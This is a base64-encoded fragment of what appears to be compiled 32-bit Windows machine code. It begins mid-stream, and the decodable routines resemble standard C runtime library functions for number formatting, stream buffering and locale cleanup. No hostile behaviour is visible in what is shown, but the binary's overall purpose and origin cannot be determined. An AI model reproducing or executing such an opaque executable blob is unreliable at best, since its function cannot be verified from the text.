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4XsAAAAhMAPheQAAABqclk70XIIi9GJjaD4//+LwomFrPj//4P6/w+EkwAAAIvyjY0w/v//i5W0+P//K/KNDLGJjaT4//87wnJnO/NzBIs56wIz/41G/zvDcwWLQfzrAjPAI72o+P//I4WM+P//i42w+P//0+eLjZD4///T6IuNpPj//wv4i4Ws+P//g+kEiY2k+P//ibyFMP7//0hOiYWs+P//g/j/dAiLnSz+///rlYuVoPj//4u9tPj//2oCXoX/dAyLzzPAjb0w/v//86uAvbv4//8Au8wBAAB0C41CAYmFLP7//+sziZUs/v//6yszwLvMAQAAUImFjPr//4mFLP7//42FkPr//1CNhTD+//9TUOjE2P//g8QQg6WU+v//ADPAQIm1kPr//4mFjPr//4mFXPz//2oE6Rn+//+B/gL8//8PhBkBAACDpZD6//8AagJZx4WU+v//AAAQAImNjPr//zvZD4X3AAAAM9KLhBWQ+v//O4QVMP7//w+F4QAAAIPCBIP6CHXkg6Wc+P//AA+9x3QFjVAB6wIz0mogWCvCi/E7wY2FOP7//4mFrPj//4v4D5KFu/j//zvzcwqLF4mVsPj//+sHg6Ww+P//AI1G/zvDcwWLV/zrAjPSi4Ww+P//g+8EweACweoeM9CLhaz4//9OiRCD6ASJhaz4//+D/v90CIudLP7//+utM8A4hbv4//8PlcADwSuNtPj//4v5iYUs/v//we8FjYWQ+v//i/eJjaj4///B5gJWagBQ6B1t//+Ljaj4//8zwECD4R/T4ImENZD6//+NRwHpQAEAAIuEnSz+//+DpZz4//8AD73AdAWNSAHrAjPJaiBYK8GD+AEPksCD+3OIhbv4//8Pl8GD+3N1CITAdASwAesCMsCEyQ+FmwAAAITAD4WTAAAAanJZO9lzAovLg/n/dGmNvTD+//+L8Y08j4m9rPj//zvzcwqLF4mVsPj//+sHg6Ww+P//AI1G/zvDcwWLV/zrAjPSi4Ww+P//g+8EA8DB6h8z0IuFrPj//06JEIPoBImFrPj//4P+/3QIi50s/v//666LtbT4//+Avbv4//8AdAuNQQGJhSz+///rM4mNLP7//+srg6WM+v//AI2FkPr//4OlLP7//wBqAFCNhTD+//9ozAEAAFDobtb//4PEEDP/jYWQ+v//Ryv+i9/B6wWL88HmAlZqAFDo1Gv//zPAg+cfQIvP0+CJhDWQ+v//jUMBiYWM+v//u8wBAACJhVz8///B4AJQjYWQ+v//UI2FYPz//1NQ6BDW//+DxByLhZT4//8z0moKWYmNjPj//4XAD4hjBAAA9/GJhZD4//+LyomNnPj//4XAD4RxAwAAg/gmdgNqJlgPtgyFRmoBEA+2NIVHagEQi/mJhaT4///B5wJXjQQxiYWM+v//jYWQ+v//agBQ6Chr//+LxsHgAlCLhaT4//8PtwSFRGoBEI0EhUBhARBQjYWQ+v//A8dQ6G4+AACLjYz6//+DxBiJjaD4//+D+QF3eou9kPr//4X/dRMzwImFvPj//4mFXPz//+mfAgAAg/8BD4SuAgAAg71c/P//AA+EoQIAAIuFXPz//zPJiYWo+P//M/aLx/ektWD8//8DwYmEtWD8//+D0gBGi8o7taj4//914OmsAAAAiYyFYPz///+FXPz//+laAgAAg71c/P//AQ+HvgAAAIu9YPz//4vBweACUI2FkPr//4mNXPz//1CNhWD8//9TUOi21P//g8QQhf91GjPAiYWM+v//iYVc/P//UI2FkPr//+n1AQAAg/8BD4T9AQAAg71c/P//AA+E8AEAAIuFXPz//zPJiYWo+P//M/aLx/ektWD8//8DwYmEtWD8//+D0gBGi8o7taj4//914IXJD4S4AQAAi4Vc/P//g/hzD4I9////M8CJhYz6//+JhVz8//9QjYWQ+v//6ewBAAA7jVz8//+NvZD6//8PksCEwA+FgwAAAI29YPz//42VkPr//4mVsPj//4TAdQaLjVz8//+Jjaz4//+EwHQMi4Vc/P//iYWg+P//M9Iz9omVvPj//4XJD4QRAQAAjYXA+P//K/iJvXz4//+NBLeLhAXA+P//iYWo+P//hcB1JTvyD4XeAAAAIYS1wPj//41WAYmVvPj//+nJAAAAjZVg/P//64EzwDP/i86JhbT4//85haD4//8PhJQAAACD+XN0VzvKdReDpI3A+P//AEADxomFvPj//4uFtPj//4uVsPj//4sEgvelqPj//wPHg9IAAYSNwPj//4uFtPj//4PSAEBBiYW0+P//i/qLlbz4//87haD4//91pIX/dDSD+XMPhLQAAAA7ynURg6SNwPj//wCNQQGJhbz4//+LxzP/AYSNwPj//4uVvPj//xP/QevIg/lzD4SAAAAAi718+P//i42s+P//RjvxD4X9/v//i8KJlVz8///B4AJQjYXA+P//UI2FYPz//1NQ6JLS//+DxBCwAYTAdGyLhZD4//8rhaT4//+JhZD4//8PhZX8//+LjZz4//+FyQ+EEwUAAIs8jdxqARCF/3VdM8CJhZz2//+JhVz8//9Q6zozwImFnPb//4mFXPz//1CNhaD2//9QjYVg/P//U1DoJNL//4PEEDLA65CDpZz2//8Ag6Vc/P//AGoAjYWg9v//UI2FYPz//+mhBAAAg/8BD4SiBAAAi4Vc/P//iYWc+P//hcAPhI4EAAAz9jPJi8f3pI1g/P//A8aJhI1g/P//g9IAQYvyO42c+P//deCF9g+EYgQAAIuFXPz//4P4cw+DS////4m0hWD8////hVz8///pQQQAAPfY9/GJhaz4//+LyomNqPj//4XAD4RMAwAAg/gmdgNqJlgPtgyFRmoBEA+2NIVHagEQi/mJhbT4///B5wJXjQQxiYWM+v//jYWQ+v//agBQ6MNm//+LxsHgAlCLhbT4//8PtwSFRGoBEI0EhUBhARBQjYWQ+v//A8dQ6Ak6AACLjYz6//+DxBiJjaD4//+D+QEPh5MAAACLvZD6//+F/3UaM8CJhZz2//+JhSz+//9QjYWg9v//6XICAACD/wEPhHoCAACDvSz+//8AD4RtAgAAi4Us/v//M8mJhZz4//8z9ovH96S1MP7//wPBiYS1MP7//4PSAEaLyju1nPj//3XghckPhDUCAACLhSz+//+D+HMPg8QCAACJjIUw/v///4Us/v//6RQCAACDvSz+//8Bd3yLvTD+//+LwcHgAlCNhZD6//+JjSz+//9QjYUw/v//U1DoOND//4PEEIX/D4Q9////g/8BD4TRAQAAg70s/v//AA+ExAEAAIuFLP7//zPJiYWc+P//M/aLx/ektTD+//8DwYmEtTD+//+D0gBGi8o7tZz4//914OlS////O40s/v//jb2Q+v//D5LAhMAPhYMAAACNvTD+//+NlZD6//+JlZD4//+EwHUGi40s/v//iY2w+P//hMB0DIuFLP7//4mFoPj//zPSM/aJlbz4//+FyQ+EEQEAAI2FwPj//yv4ib18+P//jQS3i4QFwPj//4mFnPj//4XAdSU78g+F3gAAACGEtcD4//+NVgGJlbz4///pyQAAAI2VMP7//+uBM8Az/4vOiYWk+P//OYWg+P//D4SUAAAAg/lzdFc7ynUXg6SNwPj//wBAA8aJhbz4//+LhaT4//+LlZD4//+LBIL3pZz4//8Dx4PSAAGEjcD4//+LhaT4//+D0gBAQYmFpPj//4v6i5W8+P//O4Wg+P//daSF/3Q0g/lzD4QKAQAAO8p1EYOkjcD4//8AjUEBiYW8+P//i8cz/wGEjcD4//+Llbz4//8T/0HryIP5cw+E1gAAAIu9fPj//4uNsPj//0Y78Q+F/f7//4vCiZUs/v//weACUI2FwPj//1CNhTD+//9TUOhWzv//g8QQsAGEwA+EwQAAAIuFrPj//yuFtPj//4mFrPj//w+Fuvz//4uNqPj//4XJD4TTAAAAiwSN3GoBEImFnPj//4XAD4SYAAAAg/gBD4S1AAAAi40s/v//hckPhKcAAAAz/zP296S1MP7//wPHiYS1MP7//4uFnPj//4PSAEaL+jvxdeCF/3R/i4Us/v//g/hzc06JvIUw/v///4Us/v//62UzwFCJhZz2//+JhSz+//+NhaD2//9QjYUw/v//U1Doks3//4PEEDLA6Tf///+DpZz2//8Ag6Us/v//AGoA6w8zwFCJhSz+//+JhZz2//+NhaD2//9QjYUw/v//U1DoU83//4PEEIu9hPj//4v3i40s/v//ibW0+P//hcl0dzP2M/+LhL0w/v//agpa9+IDxomEvTD+//+D0gBHi/I7+XXhibWc+P//hfaLtbT4//90QouNLP7//4P5c3MRi8KJhI0w/v///4Us/v//6yYzwFCJhZz2//+JhSz+//+NhaD2//9QjYUw/v//U1Doxsz//4PEEIv+jYVc/P//UI2FLP7//1Do5en//1lZagpaO8IPhZEAAAD/hZT4//+NdwGLhVz8///GBzGJtbT4//+FwA+EiwAAADP/i/AzyYuEjWD8///34moKA8eJhI1g/P//g9IAQYv6WjvOdeGLtbT4//+F/3Rci4Vc/P//g/hzcw+JvIVg/P///4Vc/P//60IzwFCJhZz2//+JhVz8//+NhaD2//9QjYVg/P//U1DoFcz//4PEEOsahcB1CYuFlPj//0jrEwQwjXcBiAeJtbT4//+LhZT4//+LjYD4//+JQQSLjYj4//+FwHgKgfn///9/dwIDyItFHEg7w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/fTI9l0EP826FKP//9HjXYEWTv7dfBfXltdw4v/VYvsVot1CIX2D4TQAAAAagdW6Kv///+NRhxqB1DooP///41GOGoMUOiV////jUZoagxQ6Ir///+NhpgAAABqAlDofP////+2oAAAAOjxjv///7akAAAA6OaO////tqgAAADo247//42GtAAAAGoHUOhN////jYbQAAAAagdQ6D////+DxESNhuwAAABqDFDoLv///42GHAEAAGoMUOgg////jYZMAQAAagJQ6BL/////tlQBAADoh47///+2WAEAAOh8jv///7ZcAQAA6HGO////tmABAADoZo7//4PEKF5dw4v/VYvsg+wYoQTgARAzxYlF/FNWV/91CI1N6Ogfcf//i00chcl1C4tF7ItACIvIiUUcM8Az/zlFIFdX/3UUD5XA/3UQjQTFAQAAAFBR/xV4IAEQiUX4hcAPhJkAAACNHACNSwg72RvAhcF0So1LCDvZG8AjwY1LCD0ABAAAdxk72RvAI8HokyYAAIv0hfZ0YMcGzMwAAOsZO9kbwCPBUOj2jf//i/BZhfZ0RccG3d0AAIPGCOsCi/eF9nQ0U1dW6IlY//+DxAz/dfhW/3UU/3UQagH/dRz/FXggARCFwHQQ/3UYUFb/dQz/FQAhARCL+FboZtv//1mAffQAdAqLReiDoFADAAD9i8eNZdxfXluLTfwzzeilNf//i+Vdw+jzv///M8mEwA+UwYvBw4v/VYvsg30IAHUV6I6Y///HABYAAADox5f//4PI/13D/3UIagD/NVzxARD/FTggARBdw4v/VYvsV4t9CIX/dQv/dQzoJo3//1nrJFaLdQyF9nUJV+jbjP//WesQg/7gdiXoOJj//8cADAAAADPAXl9dw+ifyP//hcB05lbob3///1mFwHTbVldqAP81XPEBEP8VNCABEIXAdNjr0moMaLjLARDoSUD//4Nl5ACLRQj/MOiY1v//WYNl/ACLRQyLAIswi9bB+gaLxoPgP2vIMIsElejtARD2RAgoAXQLVujiAAAAWYvw6w7osZf//8cACQAAAIPO/4l15MdF/P7////oDQAAAIvG6CtA///CDACLdeSLRRD/MOhV1v//WcOL/1WL7IPsDItFCI1N/4lF+IlF9I1F+FD/dQyNRfRQ6Fr///+L5V3Di/9Vi+xRVot1CIP+/nUV6DGX//+DIADoPJf//8cACQAAAOtThfZ4Nzs16O8BEHMvi8aL1oPgP8H6BmvIMIsElejtARD2RAgoAXQUjUUIiUX8jUX8UFboff///1lZ6xvo4Zb//4MgAOjslv//xwAJAAAA6CWW//+DyP9ei+Vdw4v/VYvsVleLfQhX6FDW//9Zg/j/dQQz9utOoejtARCD/wF1CfaAiAAAAAF1C4P/AnUc9kBYAXQWagLoIdb//2oBi/DoGNb//1lZO8Z0yFfoDNb//1lQ/xUwIAEQhcB1tv8VdCABEIvwV+hh1f//WYvPg+c/wfkGa9cwiwyN6O0BEMZEESgAhfZ0DFboE5b//1mDyP/rAjPAX15dw4v/VYvsi0UIM8mJCItFCIlIBItFCIlICItFCINIEP+LRQiJSBSLRQiJSBiLRQiJSByLRQiDwAyHCF3Dahxo2MsBEOhJPv//i30Ig//+dRjo1pX//4MgAOjhlf//xwAJAAAA6cwAAACF/w+IrAAAADs96O8BEA+DoAAAAIvPwfkGiU3ki8eD4D9r0DCJVeCLBI3o7QEQD7ZEECiD4AF0fFfoSNT//1mDzv+JddSL3old2INl/ACLReSLBIXo7QEQi03g9kQIKAF1Fehvlf//xwAJAAAA6FGV//+DIADrHP91FP91EP91DFfoUwAAAIPEEIvwiXXUi9qJXdjHRfz+////6A0AAACL0+sui30Ii13Yi3XUV+j30///WcPoCpX//4MgAOgVlf//xwAJAAAA6E6U//+Dzv+L1ovG6Jc9///Di/9Vi+xRUVaLdQhXVuhy1P//g8//WTvHdRHo3pT//8cACQAAAIvHi9frTf91FI1N+FH/dRD/dQxQ/xUsIAEQhcB1D/8VdCABEFDoeJT//1nr04tF+ItV/CPCO8d0x4tF+IvOg+Y/wfkGa/YwiwyN6O0BEIBkMSj9X16L5V3Di/9Vi+z/dRT/dRD/dQz/dQjoZ/7//4PEEF3Di/9Vi+z/dRT/dRD/dQz/dQjoUf///4PEEF3Di/9Vi+xRodDnARCD+P51CujRAwAAodDnARCD+P91B7j//wAA6xtqAI1N/FFqAY1NCFFQ/xUoIAEQhcB04maLRQiL5V3DoZDxARDDi/9Vi+yLTQgzwDgBdAw7RQx0B0CAPAgAdfRdw4v/VYvsVuhNBgAAi3UIiQbohgYAAIlGBDPAXl3Di/9Vi+xRUYNl+ACDZfwAVot1CP826AwHAAD/dgTohAcAAI1F+FDouP///4sGg8QMO0X4dQyLRgQ7Rfx1BDPA6wMzwEBei+Vdw4v/VYvsUVGDZfgAjUX4g2X8AFDogv///1mFwHQFM8BA6ymLTQiLVfiLRfyJQQSNRfiJEYPKH1CJVfjoeP///1mFwHXZ6JQHAAAzwIvlXcODPbzxARAAD4SCAAAAg+wID65cJASLRCQEJYB/AAA9gB8AAHUP2TwkZosEJGaD4H9mg/h/jWQkCHVV6VkIAACQgz288QEQAHQyg+wID65cJASLRCQEJYB/AAA9gB8AAHUP2TwkZosEJGaD4H9mg/h/jWQkCHUF6QUIAACD7AzdFCToEg8AAOgNAAAAg8QMw41UJATovQ4AAFKb2TwkdEyLRCQMZoE8JH8CdAbZLUhtARCpAADwf3ReqQAAAIB1Qdns2cnZ8YM9lPEBEAAPhdwOAACNDTBrARC6GwAAAOnZDgAAqQAAAIB1F+vUqf//DwB1HYN8JAgAdRYlAAAAgHTF3djbLQBtARC4AQAAAOsi6CgOAADrG6n//w8AdcWDfCQIAHW+3djbLapsARC4AgAAAIM9lPEBEAAPhXAOAACNDTBrARC6GwAAAOhpDwA